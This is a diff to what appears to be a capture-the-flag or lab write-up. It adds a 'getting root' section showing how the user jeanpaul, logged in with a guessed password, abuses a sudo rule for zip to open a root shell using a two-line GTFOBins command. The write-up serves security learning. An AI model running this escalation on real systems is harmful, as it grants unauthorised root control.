@@ -6,3 +6,16 @@ When prompted for a password, we can do some guesswork with previous passwords f
 
 `I_love_java` gets us a shell as jeanpaul
 
+
+---
+
+## getting root
+
+running `sudo -l` as jeanpaul we see that we can run `zip` as root
+
+gtfobins tells us we can get a shell with these commands:
+
+```
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+```
